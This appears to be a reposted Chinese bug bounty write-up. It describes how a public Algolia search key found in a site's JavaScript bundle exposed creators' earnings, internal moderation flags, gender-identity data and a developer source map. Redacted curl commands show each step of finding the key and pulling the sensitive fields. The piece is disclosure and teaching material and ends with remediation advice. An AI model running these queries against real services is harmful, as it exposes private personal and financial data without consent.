---
title: 0186.从报告重复到高额赏金
url: https://mp.weixin.qq.com/s/f06l4vLdDx64F6eQVqARLg
source: Doonsec's feed
date: 2026-07-13
fetch_date: 2026-07-14T04:42:34.695688
---

# 0186.从报告重复到高额赏金

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MW9pCm89BusANqT87qzDESd2Ly7IzKeUWnr8NOPXMKL8BfBGzcicHp6xlKiciaHpZss6pOovUISTPIJXxneiathsia9RHkwm3KxUvBjq2QIBGIf8/0?wx_fmt=jpeg)

# 0186.从报告重复到高额赏金

原创

Tyrion404
Tyrion404

Rsec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

本文章仅用网络安全研究学习，请勿使用相关技术进行违法犯罪活动。

声明：本文搬运自互联网，如你是原作者，请联系我们！

类型：信息泄露

## 一把钥匙，十五万四千个秘密

### 一个 Algolia API 密钥如何在零身份验证的情况下泄露名人收入、性别认同数据，甚至未成年人数据

###

## 回到一个旧案子

大约一个月前，我就已经报告过完全相同的问题。根本原因相同，泄露的数据也相同。报告被关闭并标记为“重复”，然后标记为“已分类”，最后标记为 **“已解决****”** 。我当时以为平台已经修复了这个问题，就没再想它了。

一个月后，我翻阅着自己以前的报告——就像重读旧案卷，回忆当时的思路一样，回顾过去的工作。这份报告再次引起了我的注意。出于好奇而非怀疑，我决定重现一个月前的操作步骤，看看究竟是怎么回事。

它仍然有效。每个命令仍然返回实时数据。

起初我以为平台可能在内部将报告标记为“已解决”，而实际的修复程序仍在部署中——这种情况偶尔会发生。但后来我想起了一件重要的事情：这份报告在关闭之前经过了**初步评估**，我记得在早期评估阶段，有人告诉我这个问题正在积极修复中。如果真是这样，那么一个月后问题仍然存在，同时又被标记为“已解决”，这显然是不合理的。

这种不一致才是真正的信号。它意味着两种情况之一：要么修复程序根本没有部署，要么部署了但执行错误。所以我重新运行了一个月前使用的完全相同的查询：

```
curl -s "https://[REDACTED_APP_ID]-dsn.algolia.net/1/indexes/prod_[REDACTED]_talent_v0/query" \  -H "X-Algolia-Application-Id: [REDACTED_APP_ID]" \  -H "X-Algolia-API-Key: [REDACTED_API_KEY]" \  -H "Content-Type: application/json" \  -d '{"query":"","hitsPerPage":1,"attributesToRetrieve":["username","internal_engagement_scores","computed_features_order_counts"]}'
```

相同的密钥。相同的端点。相同的实时数据，一个月后。我已将其整理干净并重新提交。

那一次复核就把原本应该被判定为**重复的**报告变成了**被接受并获得奖励的报告。**

## 开端

故事始于一个简单的问题：当 [REDACTED] 显示可搜索的公开人才资料列表时，后台究竟是什么在驱动着这种搜索？

## 第一步——从未隐藏的钥匙

我打开了 [REDACTED\_DOMAIN]，调出了公共 JavaScript 包，并在其中搜索了“apiKey”一词。返回的结果是一个有效的 Algolia 搜索键——[REDACTED] 使用该服务来支持其人才搜索——以及它指向的索引名称。

```
curl -s "https://www.[REDACTED_DOMAIN]/dist/bundle-[REDACTED_BUILD_HASH].js" | \  grep -o 'appId:"[^"]*"[^}]*apiKey:"[^"]*"'
Output:appId:"[REDACTED_APP_ID]",apiKey:"[REDACTED_API_KEY]",talentIndexName:"prod_[REDACTED]_talent_v0"
```

单就这一点而言，这并不奇怪。Algolia 的搜索键本来就是公开的——它们本质上就是仅供搜索使用的。真正的问题不在于键本身，而在于该键被允许检索的内容。

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89ButbpibiaUWXa2ISrx2Jya1hRvhqtdHCicfovTj4hibToZRn5aY0G7M7Kux031vSZwFK5hicB0fK8lN8LfBm4OjSt9XhfsKWAXuPkUBg/640?wx_fmt=png&from=appmsg)

JS 文件中的 API 密钥

## 步骤 2 — 当搜索结果过多时

我向索引发送了一个普通的搜索查询——与[已编辑]自己的前端每天发送数千次的请求类型相同。但返回的结果并非只有名称、照片和价格，还包括内部财务字段：

```
curl -s "https://[REDACTED_APP_ID]-dsn.algolia.net/1/indexes/prod_[REDACTED]_talent_v0/query" \  -H "X-Algolia-Application-Id: [REDACTED_APP_ID]" \  -H "X-Algolia-API-Key: [REDACTED_API_KEY]" \  -H "Content-Type: application/json" \  -d '{"query": "", "hitsPerPage": 1, "attributesToRetrieve": ["username", "internal_engagement_scores", "computed_features_order_counts"]}'
```

回复：

```
{  "username": "[REDACTED_USERNAME]",  "internal_engagement_scores": {    "rank_scores": {      "lifetime_completed_gmv": [REDACTED],      "l28_completed_gmv": [REDACTED],      "l364_completed_gmv": [REDACTED]    }  },  "computed_features_order_counts": {    "order_count_all_time": [REDACTED]  }}
```

换句话说，任何人——无需登录——都可以查到某个特定人员账号自开通以来在[已编辑]平台上的具体收入。数十万个账号的精确财务数据，完全公开。

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89BusHianK8Z4vtafTnvaU081khV0za9JeJjEZ73icBjdZDBbB7NR0oNiaHmiajicUdEevWibokafJyUNaDdLOYjkfdoDqdFTbmqqFB1KRA/640?wx_fmt=png&from=appmsg)

## 第三步——不仅是资金，还有内部决策

此外，还有一个字段用于标记每个账户的内部审核状态（ `restrictions` ）。而且这个字段是可筛选的，这意味着我可以直接向 API 发出请求：“显示所有被标记为最高限制级别的账户”，它会按名称返回完整的账户列表。

```
curl -s "https://[REDACTED_APP_ID]-dsn.algolia.net/1/indexes/prod_[REDACTED]_talent_v0/query" \  -H "X-Algolia-Application-Id: [REDACTED_APP_ID]" \  -H "X-Algolia-API-Key: [REDACTED_API_KEY]" \  -H "Content-Type: application/json" \  -d '{"query": "", "hitsPerPage": 50, "filters": "restrictions:high", "attributesToRetrieve": ["username", "name", "restrictions"]}'
```

结果：13 个已命名的帐户，全部枚举，全部标记为 `restrictions:high` 。

这不仅仅是数据泄露，更是[REDACTED]内部审核决策的曝光——这些信息绝不应该流出内部团队。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89BusKTOj1UpQQ3oibUSibFkK7sN6YZf8NmBuAz9feFWxnWSYUUJZT6HoySPg8Q1hvrvAoFZRbvrOugm52PmkPqmfs8R47wNMLXQC90/640?wx_fmt=png&from=appmsg)

## 第四步——第二扇门，大开着

同一个密钥也适用于第二个索引 `prod_[REDACTED]_business_talent_v0` ，该索引用于企业/公司人才帐户，而不是个人。

```
curl -s "https://[REDACTED_APP_ID]-dsn.algolia.net/1/indexes/prod_[REDACTED]_business_talent_v0/query" \  -H "X-Algolia-Application-Id: [REDACTED_APP_ID]" \  -H "X-Algolia-API-Key: [REDACTED_API_KEY]" \  -H "Content-Type: application/json" \  -d '{"query":"","hitsPerPage":0}'
```

响应： `{"nbHits": [REDACTED_~80K],...}` — 大约 80,000 条记录，相同的密钥，没有额外的保护。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89BuvBoJB5vwcIQgQYKU5ENZNBicc8TNGgiamggeUtJZwO3TnfE3XHHwGzMFJDhxicd3V7Tia5NiaK8QNzhTVsIhsETOVXh3yiauL6ITRZc/640?wx_fmt=png&from=appmsg)

## 第五步——高度敏感的身份数据

第二个索引中包含一个人口统计字段（ `talent_demographic.gender` ），其中包含性别认同数据，包括非二元性别和跨性别分类。

```
curl -s "https://[REDACTED_APP_ID]-dsn.algolia.net/1/indexes/prod_[REDACTED]_business_talent_v0/query" \  -H "X-Algolia-Application-Id: [REDACTED_APP_ID]" \  -H "X-Algolia-API-Key: [REDACTED_API_KEY]" \  -H "Content-Type: application/json" \  -d '{"query":"","hitsPerPage":1,"facets":["talent_demographic.gender"],"maxValuesPerFacet":10}'
```

回复：

```
{  "facets": {    "talent_demographic.gender": {      "male": [REDACTED],      "female": [REDACTED],      "non_binary": [REDACTED],      "trans_female": [REDACTED]    }  }}
```

这类数据一旦泄露，会带来现实风险，因为它会影响相关人员的安全和隐私。实际上，这原本是之前报告中声称已经修复的问题的一部分——但当时的修复只涉及第一个索引，第二个索引则完全被忽略了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89But3icK46vptLXEU7u2xJWVicBwYrdTy27icfkuN2dibeA1dtxW2PBtoSOjicicVdlA1KFhUooStX9tibpNYm69Y9aiaHKtPLFSqzWHaspc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89BuuvAgguvQ1siae08cmia36WrX7g9UxWH11zI9riaryjq4MzGncQHGjELeCslznXvWndU0BpJia0S81DfnFaQ6Es6UgKodn3rJ1NfpE/640?wx_fmt=png&from=appmsg)

## 步骤 6 — 完整的源地图

最后一点： `server.js.map` 文件中的源映射文件。源映射文件是供开发人员调试代码用的，绝不应该公开。

```
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \  'https://[REDACTED_SUBDOMAIN]/dist/server.js.map'# Output: 200  10800000
```

该文件为实时文件，大小为 10.8MB，其中包含以纯文本 TypeScript 源代码形式再次出现的 API 密钥、第二个独立的 Algolia 开发密钥，以及从 [已编辑] 的反自动化（设备指纹识别）检查中排除的端点的完整列表。

这已经不仅仅是数据泄露了，它还是绕过平台自身防御机制的蓝图。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89ButPajngHsJlicC26FMg4zeiaVLWqJ15rBK3UtfVOEr8dYhv4BBHTtWXyoF5gMRxEZSVG0d4KUnxs1bgR5gDlvYSE9iczicqA7IDErc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89ButVHD71c16lWQ7ibZsXiaOq1qdKOVhQdcgkiaBgYj3spviczfxRicev4ojpjvj0JC5th7C61KSYwia5K02IN4ZTBpiaA1SqSCcvJJPiaGc/640?wx_fmt=png&from=appmsg)

方法论

##

## 要点总结

如果单个搜索键的权限范围设置不正确，则可能会暴露以下问题：

* 数十万个账户的精确财务数据
* 敏感的内部审核决定
* 敏感个人身份数据
* 通过一个被遗忘的文件，获得了额外的开发凭证

解决方法并不复杂：明确列出哪些字段可以安全地公开返回，轮换任何已公开的键，并完全阻止对源映射文件的公开访问。

有时候，解决方法也不复杂——回去重新阅读你自己的旧工作，检查“已解决”是否真的意味着已解决。

现在我因高严重性获得了$$$$奖励

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MW9pCm89BusQqIXdM0tlonz6cOe2ZHKV3XMicaf5dl16IaKYNGdHRjDiaYJn3iaOFZNLkBwYVaJ1dnZ32X6ph6hm41hNiaKxj4FIajKmAPavia0I/640?wx_fmt=jpeg&from=appmsg)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs98K2tqBAticMskicyUAjtQoicZSdgKiaj1G5KGKOyd7A6paRrrHhz2JVvU3RLRsboI6MibP7Nl68yVAyTw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过